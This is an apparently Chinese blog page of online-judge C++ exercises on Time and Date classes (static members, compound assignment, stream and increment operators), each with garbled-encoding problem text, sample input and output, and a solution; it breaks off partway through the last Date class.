<h2 id="Input-30"><a href="#Input-30" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥ä¸ºå¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€ç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„3ä¸ªæ•´æ•°ï¼šhh,mm,ssï¼Œåˆ†åˆ«è¡¨ç¤ºæ—¶ã€åˆ†ã€ç§’ï¼Œå…¶å€¼éƒ½åœ¨intèŒƒå›´å†…ã€‚</p>
<h2 id="Output-30"><a href="#Output-30" class="headerlink" title="Output"></a>Output</h2><p>å¼€å§‹éƒ¨åˆ†ä¸ºç”±main()å‡½æ•°äº§ç”Ÿçš„å›ºå®šè¾“å‡ºï¼Œç”¨äºæµ‹è¯•å¯¹è±¡çš„æŸäº›æ–¹æ³•çš„è°ƒç”¨æƒ…å†µã€‚è¾“å‡ºâ€œTest data output :â€ä¹‹åä¸ºæµ‹è¯•æ•°æ®å¯¹åº”çš„è¾“å‡ºï¼š</p>
<p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€ç»„è¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¾“å‡ºéœ€è¦å‰é¢è¡¥0ã€‚å¦‚æœè¾“å…¥çš„æ—¶é—´ä¸åˆæ³•ï¼Œåˆ™è¾“å‡ºâ€œTime errorâ€ã€‚æ ¼å¼è§sampleã€‚</p>
<p>æœ€åä¸€è¡Œè¾“å‡ºä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®è¾“å…¥ã€‚</p>
<h2 id="Sample-Input-30"><a href="#Sample-Input-30" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>0 0 10 59 591 1 6023 0 023 59 5924 1 0</p>
<h2 id="Sample-Output-30"><a href="#Sample-Output-30" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Static member test output :Now, There is 0 object of Time.Now, There is 1 object of Time.There was a call to the copy constructor : 0,0,0Now, There is 2 object of Time.Now, There is 3 object of Time.There was a call to the copy constructor : 1,2,3Now, There is 4 object of Time.Test data output :00:00:0100:59:59Time error23:00:0023:59:59Time error6</p>
<h2 id="HINT-30"><a href="#HINT-30" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-30"><a href="#Append-Code-30" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1392&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
private:
    int h,m,s;
    static int num;
public:
    Time():h(0),m(0),s(0)&#123;num++;&#125;
    Time(int hh, int mm, int ss):h(hh),m(mm),s(ss)&#123;num++;&#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;cout &lt;&lt; &quot;There was a call to the copy constructor : &quot; &lt;&lt; h &lt;&lt; &quot;,&quot; &lt;&lt; m &lt;&lt; &quot;,&quot; &lt;&lt; s &lt;&lt; endl;num++;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    const Time &amp;getTime()const  
    &#123;  
        return *this;  
    &#125;  
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;    
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime() const&#123;
        if(h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;
    &#125;    
    Time &amp;inputTime()&#123; 
        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s ;
        return *this;
    &#125;  
    static int getNumber()&#123;return num;&#125;
    static void displayNumber()&#123;
        cout &lt;&lt; &quot;Now, There is &quot; &lt;&lt; num &lt;&lt; &quot; object of Time.&quot; &lt;&lt; endl;
    &#125;
&#125;;
int Time::num=0;
////////////////////
int main()
&#123;
    cout&lt;&lt;&quot;Static member test output :&quot;&lt;&lt;endl;
    Time::displayNumber();
    Time t;
    t.displayNumber();
    Time tt(t);
    tt.displayNumber();
    Time ttt(1, 2, 3);
    ttt.displayNumber();
    Time tttt(ttt.getTime());
    tttt.displayNumber();
    int non_cases = Time::getNumber();

    cout&lt;&lt;&quot;\nTest data output :&quot;&lt;&lt;endl;
    int hour, minute, second;
    while(cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second)
    &#123;
        Time t;
        t.setTime(hour, minute, second).showTime();
    &#125;
    cout&lt;&lt;t.getNumber() - non_cases&lt;&lt;endl;
&#125;</code></pre>
<blockquote>
<p>staticâ€“<a href="http://www.cnblogs.com/yc_sunniwell/archive/2010/07/14/1777441.html">http://www.cnblogs.com/yc_sunniwell/archive/2010/07/14/1777441.html</a></p>
<p> C++çš„staticæœ‰ä¸¤ç§ç”¨æ³•ï¼šé¢å‘è¿‡ç¨‹ç¨‹åºè®¾è®¡çš„staticå’Œé¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„staticã€‚å‰è€…åº”ç”¨äºæ™®é€šå˜é‡å’Œå‡½æ•°ï¼Œä¸æ¶‰åŠç±»ï¼›åè€…ä¸»è¦è¯´æ˜staticåœ¨ç±»ä¸­çš„ä½œç”¨ã€‚</p>
</blockquote>
<h3 id="32-æ—¶é—´ç±»çš„åŠ ã€å‡æ³•èµ‹å€¼è¿ç®—"><a href="#32-æ—¶é—´ç±»çš„åŠ ã€å‡æ³•èµ‹å€¼è¿ç®—" class="headerlink" title="32.æ—¶é—´ç±»çš„åŠ ã€å‡æ³•èµ‹å€¼è¿ç®—"></a>32.æ—¶é—´ç±»çš„åŠ ã€å‡æ³•èµ‹å€¼è¿ç®—</h3><blockquote>
<h2 id="Description-31"><a href="#Description-31" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œåœ¨ç±»ä¸Šé‡è½½ä»¥ä¸‹è¿ç®—ç¬¦ï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>\1. Time::Time()æ— å‚æ„é€ æ–¹æ³•ã€‚</p>
<p>\2. Time::inputTime()æ–¹æ³•ï¼šæŒ‰æ ¼å¼ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ä¿®æ”¹Timeå¯¹è±¡çš„æ—¶åˆ†ç§’æ•°å€¼ã€‚è¯¥æ–¹æ³•è¿”å›ä¿®æ”¹åçš„å¯¹è±¡ã€‚</p>
<p>\3. Time::showTime()æ–¹æ³•ï¼šè¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¦å‰é¢è¡¥0ã€‚å¦‚æœå¯¹è±¡ä¸æ˜¯åˆæ³•çš„æ—¶é—´ï¼Œåˆ™è¾“å‡ºâ€œTime errorâ€ã€‚</p>
<p>\4. è¿ç®—ç¬¦</p>
<p>åŠ æ³•èµ‹å€¼è¿ç®—ç¬¦â€œ+=â€å’Œå‡æ³•èµ‹å€¼è¿ç®—ç¬¦â€œ-=â€ï¼šæŠŠä¸€ä¸ªæ•´æ•°måŠ åˆ°Timeå¯¹è±¡è‡ªèº«ï¼Œå¹¶ä¸”ä»…å¯¹åˆæ³•çš„æ—¶é—´æ“ä½œï¼Œä¸ä¼šäº§ç”Ÿä¸åˆæ³•çš„æ—¶é—´ï¼Œæ¯”å¦‚ï¼š</p>
<p>è‹¥åŸæ—¶é—´å¯¹è±¡ä¸ºâ€œ00:00:00â€ï¼Œå‡å»2åçš„å¯¹è±¡ä¸ºâ€œ23:59:58â€;</p>
<p>è‹¥åŸæ—¶é—´å¯¹è±¡ä¸ºâ€œ23:59:59â€ï¼ŒåŠ ä¸Š1åçš„å¯¹è±¡ä¸ºâ€œ00:00:00â€;</p>
<p>è‹¥åŸæ—¶é—´å¯¹è±¡ä¸ºâ€œ24:60:60â€ï¼ŒåŠ å‡åçš„å¯¹è±¡ä»ä¸ºâ€œ24:60:60â€</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°</p>
<h2 id="Input-31"><a href="#Input-31" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„4ä¸ªæ•´æ•°ï¼Œå‰ä¸‰ä¸ªæ•´æ•°ä¸ºï¼šhh,mm,ssï¼Œåˆ†åˆ«è¡¨ç¤ºæ—¶ã€åˆ†ã€ç§’ï¼Œå…¶å€¼éƒ½åœ¨intèŒƒå›´å†…ï¼Œæœ€åä¸€ä¸ªæ•´æ•°ä¸ºmã€‚</p>
<h2 id="Output-31"><a href="#Output-31" class="headerlink" title="Output"></a>Output</h2><p>æ¯ä¸ªè¾“å…¥å¯¹åº”ä¸¤è¡Œè¾“å‡ºï¼Œåˆ†åˆ«ä¸ºæ—¶é—´â€œhh,mm,ssâ€åŠ ä¸Šmç§’å’Œå‡å»mç§’åçš„å€¼ã€‚é”™è¯¯çš„æ—¶é—´è¾“å‡ºâ€œTime errorâ€</p>
<h2 id="Sample-Input-31"><a href="#Sample-Input-31" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>60 0 1 20 59 59 11 1 60 1023 0 0 6023 59 59 10024 1 0 3</p>
<h2 id="Sample-Output-31"><a href="#Sample-Output-31" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>00:00:0323:59:5901:00:0000:59:58Time errorTime error23:01:0022:59:0000:01:3923:58:19Time errorTime error</p>
<h2 id="HINT-31"><a href="#HINT-31" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<p>left      ï¼šè®¾ç½®è¾“å‡ºå·¦å¯¹é½</p>
<p>right     ï¼šè®¾ç½®è¾“å‡ºä¼˜å¯¹é½</p>
<h2 id="Append-Code-31"><a href="#Append-Code-31" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1395&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
private:
    int h,m,s;
    int k;
public:
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh, int mm, int ss):h(hh),m(mm),s(ss)&#123; &#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    const Time &amp;getTime()const  
    &#123;  
        return *this;  
    &#125;  
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;    
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime() const&#123;
        if(h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;
    &#125;    
    Time &amp;inputTime()&#123; 
        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s ;
        return *this;
    &#125;  
    Time&amp; operator +=(int t)  
    &#123;  
        if(h*3600 + m*60 + s &gt;= 24*3600|| m&gt;59||s&gt;59||h&lt;0||s&lt;0||m&lt;0)  
            return *this;  
        else  
        &#123;  
            k = (h*3600 + m*60 + s+t)%(24*3600);  
            h = k/3600;  
            m = (k -h*3600)/60;  
            s = k-h*3600-m*60;  
            return *this;  
        &#125;  
    &#125;  
    Time&amp; operator -=(int t)  
    &#123;  
           if(h*3600 + m*60 + s &gt;= 24*3600|| m&gt;59||s&gt;59||h&lt;0||s&lt;0||m&lt;0)  
            return *this;  
        else  
        &#123;  
            k = (h*3600 + m*60 + s-t+24*3600)%(24*3600);  
            h = k/3600;  
            m = (k -h*3600)/60;  
            s = k-h*3600-m*60;  
            return *this;  
        &#125;  
    &#125;  
&#125;;
///////////////
int main()
&#123;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        Time t;
        t.inputTime();
        Time tt(t);
        int num;
        cin&gt;&gt;num;
        t += num;
        t.showTime();
        tt -= num;
        tt.showTime();
    &#125;
&#125;</code></pre>
<h3 id="33-æ—¶é—´ç±»çš„æµæ’å…¥ã€æå–å’Œé€’å¢ã€é€’å‡è¿ç®—"><a href="#33-æ—¶é—´ç±»çš„æµæ’å…¥ã€æå–å’Œé€’å¢ã€é€’å‡è¿ç®—" class="headerlink" title="33.æ—¶é—´ç±»çš„æµæ’å…¥ã€æå–å’Œé€’å¢ã€é€’å‡è¿ç®—"></a>33.æ—¶é—´ç±»çš„æµæ’å…¥ã€æå–å’Œé€’å¢ã€é€’å‡è¿ç®—</h3><blockquote>
<h2 id="Description-32"><a href="#Description-32" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œåœ¨ç±»ä¸Šé‡è½½ä»¥ä¸‹è¿ç®—ç¬¦ï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>æµæ’å…¥æ“ä½œç¬¦â€œ&gt;&gt;â€ï¼ŒæŒ‰ç…§è¾“å…¥æ ¼å¼ä»æ ‡å‡†è¾“å…¥è¯»å–ä¸‰ä¸ªæ•´æ•°ï¼šhh,mm,ssï¼Œåˆ†åˆ«è¡¨ç¤ºæ—¶ã€åˆ†ã€ç§’ï¼Œå…¶å€¼åœ¨intèŒƒå›´å†…ã€‚</p>
<p>æµæå–æ“ä½œç¬¦â€œ&lt;&lt;â€ï¼›æŒ‰ç…§â€œhh:mm:ssâ€è¾“å‡ºTimeç±»çš„å¯¹è±¡ï¼Œä¸åˆæ³•çš„æ—¶é—´è¾“å‡ºâ€œerror!!!â€ã€‚</p>
<p>å‰ç½®è‡ªå¢è¿ç®—ç¬¦â€œ++â€ï¼šæŠŠæ—¶é—´å¯¹è±¡çš„ç§’æ•°åŠ 1å¹¶è¿”å›ã€‚</p>
<p>å‰ç½®è‡ªå‡è¿ç®—ç¬¦â€œâ€“â€ï¼šæŠŠæ—¶é—´å¯¹è±¡çš„ç§’æ•°å‡1å¹¶è¿”å›ã€‚</p>
<p>åç½®è‡ªå¢è¿ç®—ç¬¦â€œ++â€ï¼šæŠŠæ—¶é—´å¯¹è±¡çš„ç§’æ•°åŠ 1ï¼Œè¿”å›åŸå€¼ã€‚</p>
<p>åç½®è‡ªå‡è¿ç®—ç¬¦â€œâ€“â€ï¼šæŠŠæ—¶é—´å¯¹è±¡çš„ç§’æ•°å‡1ï¼Œè¿”å›åŸå€¼ã€‚</p>
<p>ä»¥ä¸Š4ä¸ªè‡ªå¢ã€è‡ªå‡ä»…å¯¹åˆæ³•çš„æ—¶é—´æ“ä½œï¼Œå¹¶ä¸”ä¸ä¼šäº§ç”Ÿä¸åˆæ³•çš„æ—¶é—´ã€‚æ¯”å¦‚ï¼š</p>
<p>è‹¥åŸæ—¶é—´å¯¹è±¡ä¸ºâ€œ00:00:00â€ï¼Œè‡ªå‡è¿ç®—åçš„å¯¹è±¡ä¸ºâ€œ23:59:59â€;</p>
<p>è‹¥åŸæ—¶é—´å¯¹è±¡ä¸ºâ€œ23:59:59â€ï¼Œè‡ªå¢è¿ç®—åçš„å¯¹è±¡ä¸ºâ€œ00:00:00â€;</p>
<p>è‹¥åŸæ—¶é—´å¯¹è±¡ä¸ºâ€œ24:60:60â€ï¼Œè‡ªå¢æˆ–è‡ªå‡è¿ç®—åå¯¹è±¡ä»ä¸ºâ€œ24:60:60â€ã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°</p>
<h2 id="Input-32"><a href="#Input-32" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„3ä¸ªæ•´æ•°ï¼šhh,mm,ssï¼Œåˆ†åˆ«è¡¨ç¤ºæ—¶ã€åˆ†ã€ç§’ï¼Œå…¶å€¼éƒ½åœ¨intèŒƒå›´å†…ã€‚</p>
<h2 id="Output-32"><a href="#Output-32" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºä¸€å¼ è¡¨ï¼šæ¯åˆ—8ä¸ªå­—ç¬¦å®½ï¼Œä¸¤åˆ—ä¹‹é—´æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚</p>
<p>é¦–å…ˆï¼Œè¾“å‡ºä¸€ä¸ªè¡¨å¤´ï¼šâ€œ++t      â€“t      t        tâ€“      t++      t       â€ï¼Œ</p>
<p>å…¶æ¬¡ï¼Œå¯¹åº”æ¯ç»„æµ‹è¯•æ•°æ®åœ¨ä¸€è¡Œå†…ä¾æ¬¡ä»¥ä¸‹å†…å®¹ï¼š</p>
<p>å‰ç½®++ã€å‰ç½®â€“ã€åŸå€¼ã€åç½®â€“ã€åç½®++ã€åŸå€¼ã€‚</p>
<p>è‹¥è¾“å…¥çš„æ—¥æœŸåˆæ³•ï¼Œè¾“å‡ºæ ¼å¼ä¸ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¾“å‡ºéœ€è¦å‰é¢è¡¥0ã€‚å¦‚æœè¾“å…¥çš„æ—¶é—´ä¸åˆæ³•ï¼Œåˆ™è¾“å‡ºâ€œerror!!!â€ã€‚æ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input-32"><a href="#Sample-Input-32" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>60 0 10 59 591 1 6023 0 023 59 5924 1 0</p>
<h2 id="Sample-Output-32"><a href="#Sample-Output-32" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>++t      â€“t      t        tâ€“      t++      t       00:00:02 00:00:01 00:00:01 00:00:01 00:00:00 00:00:0101:00:00 00:59:59 00:59:59 00:59:59 00:59:58 00:59:59error!!! error!!! error!!! error!!! error!!! error!!!23:00:01 23:00:00 23:00:00 23:00:00 22:59:59 23:00:0000:00:00 23:59:59 23:59:59 23:59:59 23:59:58 23:59:59error!!! error!!! error!!! error!!! error!!! error!!!</p>
<h2 id="HINT-32"><a href="#HINT-32" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<p>left      ï¼šè®¾ç½®è¾“å‡ºå·¦å¯¹é½</p>
<p>right     ï¼šè®¾ç½®è¾“å‡ºä¼˜å¯¹é½</p>
<h2 id="Append-Code-32"><a href="#Append-Code-32" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1396&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time
&#123;
private:
    int h,m,s;
    int flag;
public:
    friend istream &amp; operator &gt;&gt; (istream &amp;is,Time &amp;t)
    &#123;
        is&gt;&gt;t.h&gt;&gt;t.m&gt;&gt;t.s;
        if(t.h&gt;23||t.h&lt;0||t.m&gt;59||t.m&lt;0||t.s&gt;59||t.s&lt;0)
            t.flag = 1;
        else t.flag = 0;
        return is;
    &#125;
    friend ostream &amp; operator &lt;&lt; (ostream &amp;os,const Time &amp;t)
    &#123;
        if(t.h*3600+t.m*60+t.s&gt;=24*3600||t.h&lt;0||t.s&lt;0||t.m&lt;0||t.m&gt;59||t.s&gt;59) &#123;os&lt;&lt;&quot;error!!!&quot;;&#125;
    else &#123;os&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;t.h&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;t.m&lt;&lt;&quot;:&quot;&lt;&lt;setw(2)&lt;&lt;t.s;&#125;
    return os;
    &#125;
    Time &amp; operator ++ ()
    &#123;
        if(h*3600+m*60+s &gt;= 24*3600||h&lt;0||s&lt;0||m&lt;0||m&gt;59||s&gt;59)
            return *this;
        else
        &#123;
            flag=((h*3600+m*60+s)+1)%(24*3600);
            h=flag/3600;
            m=(flag-h*3600)/60;
            s=flag-h*3600-m*60;
            return *this;
        &#125;
    &#125;
    Time &amp;operator --()
    &#123;
         if(h*3600+m*60+s &gt;= 24*3600||h&lt;0||s&lt;0||m&lt;0||m&gt;59||s&gt;59)
            return *this;
        else
        &#123;
            flag=((h*3600+m*60+s)-1+24*3600)%(24*3600);
            h=flag/3600;
            m=(flag-h*3600)/60;
            s=flag-h*3600-m*60;
            return *this;
        &#125;
    &#125;
    Time operator ++ (int )
    &#123;
        Time t = (*this);
        if(h*3600+m*60+s &gt;= 24*3600||h&lt;0||s&lt;0||m&lt;0||m&gt;59||s&gt;59)
            return t;
        else
        &#123;
            flag=((h*3600+m*60+s)+1)%(24*3600);
            h=flag/3600;
            m=(flag-h*3600)/60;
            s=flag-h*3600-m*60;
            return t;
        &#125;
    &#125;
     Time operator --(int)
    &#123;
        Time t = (*this);
         if(h*3600+m*60+s &gt;= 24*3600||h&lt;0||s&lt;0||m&lt;0||m&gt;59||s&gt;59)
            return t;
        else
        &#123;
            flag=((h*3600+m*60+s)-1+24*3600)%(24*3600);
            h=flag/3600;
            m=(flag-h*3600)/60;
            s=flag-h*3600-m*60;
            return t;
        &#125;
    &#125;
&#125;;
int main()
&#123;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;++t&quot;&lt;&lt;&quot; &quot;;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;--t&quot;&lt;&lt;&quot; &quot;;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;t&quot;&lt;&lt;&quot; &quot;;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;t--&quot;&lt;&lt;&quot; &quot;;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;t++&quot;&lt;&lt;&quot; &quot;;
    cout&lt;&lt;setw(8)&lt;&lt;left&lt;&lt;&quot;t&quot;&lt;&lt;right&lt;&lt;endl;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        cin&gt;&gt;t;
        cout&lt;&lt;(++t)&lt;&lt;&quot; &quot;;
        cout&lt;&lt;(--t)&lt;&lt;&quot; &quot;;
        cout&lt;&lt;t&lt;&lt;&quot; &quot;;
        cout&lt;&lt;t--&lt;&lt;&quot; &quot;;
        cout&lt;&lt;t++&lt;&lt;&quot; &quot;;
        cout&lt;&lt;t&lt;&lt;endl;
    &#125;
&#125;
</code></pre>
<h3 id="34-æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIï¼‰"><a href="#34-æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIï¼‰" class="headerlink" title="34.æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIï¼‰"></a>34.æ—¶é—´å’Œæ—¥æœŸç±»ï¼ˆIï¼‰</h3><blockquote>
<h2 id="Description-33"><a href="#Description-33" class="headerlink" title="Description"></a>Description</h2><p>è®¾è®¡ä¸€ä¸ªæ—¶é—´ç±»å’Œä¸€ä¸ªæ—¥æœŸç±»ï¼Œç”¨äºè¯»å–è¾“å…¥çš„æ•°æ®ï¼ŒæŒ‰æ ¼å¼è¾“å‡ºæ—¥æœŸå’Œæ—¶é—´ã€‚</p>
<p>è®¾è®¡æ—¥æœŸç±»Dateéœ€æ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>Date::Date(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºå¹´æœˆæ—¥ï¼Œç”¨å‚æ•°å°†æ—¥æœŸåˆå§‹åŒ–ã€‚</p>
<p>Date::showDate()æŒ‰æ ¼å¼è¾“å‡ºDateå¯¹è±¡ã€‚</p>
<p>è®¾è®¡æ—¶é—´ç±»Timeéœ€æ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>Time::Time(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ å…¥çš„å‚æ•°ä¾æ¬¡ä¸ºæ—¶åˆ†ç§’ï¼Œç”¨å‚æ•°å°†æ—¶é—´åˆå§‹åŒ–ã€‚</p>
<p>Time::showTime()æŒ‰æ ¼å¼è¾“å‡ºTimeå¯¹è±¡ã€‚</p>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡Dateç±»å’ŒTimeç±»ï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°ã€‚</p>
<h2 id="Input-33"><a href="#Input-33" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ã€‚</p>
<p>åé¢çš„è¾“å…¥æ¯è¡Œä¸ºä¸€ç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„æµ‹è¯•æ•°æ®çš„å‰3ä¸ªæ•´æ•°æ˜¯æ—¥æœŸçš„å¹´æœˆæ—¥ï¼Œå3ä¸ªæ•´æ•°æ˜¯æ—¶é—´çš„æ—¶åˆ†ç§’ã€‚</p>
<h2 id="Output-33"><a href="#Output-33" class="headerlink" title="Output"></a>Output</h2><p>æ¯ç»„æµ‹è¯•æ•°æ®å¯¹åº”ä¸€è¡Œè¾“å‡ºã€‚æ—¥æœŸçš„è¾“å‡ºæ ¼å¼ä¸ºâ€œyyyy-mm-ddâ€ï¼Œæ—¶é—´çš„è¾“å‡ºæ ¼å¼ä¸ºâ€œhh:mm:ssâ€ï¼Œä¸­é—´ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ã€‚</p>
<h2 id="Sample-Input-33"><a href="#Sample-Input-33" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>31982 10 1 0 0 02000 2 28 23 59 592014 7 2 13 30 01</p>
<h2 id="Sample-Output-33"><a href="#Sample-Output-33" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>1982-10-01 00:00:002000-02-28 23:59:592014-07-02 13:30:01</p>
<h2 id="HINT-33"><a href="#HINT-33" class="headerlink" title="HINT"></a>HINT</h2><p>è¾“å‡ºæ ¼å¼ç”¨å¤´æ–‡ä»¶<iomanip>ä¸­æµæ“ä½œç®—å­ï¼š</p>
<p>setw(w)   ï¼šè®¾ç½®æ•°æ®çš„è¾“å‡ºå®½åº¦ä¸ºwä¸ªå­—ç¬¦</p>
<p>setfill(c)ï¼šè®¾ç½®ç”¨å­—ç¬¦cä½œä¸ºå¡«å……å­—ç¬¦</p>
<h2 id="Append-Code-33"><a href="#Append-Code-33" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1574&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Date&#123;
public:
    int y,m,d;
    Date()&#123;&#125;
    Date(int yy,int mm,int dd):y(yy),m(mm),d(dd)&#123;&#125;
    void showDate()&#123;
        cout &lt;&lt; y &lt;&lt; &quot;-&quot; &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; m &lt;&lt; &quot;-&quot; &lt;&lt; d;
    &#125;
&#125;;
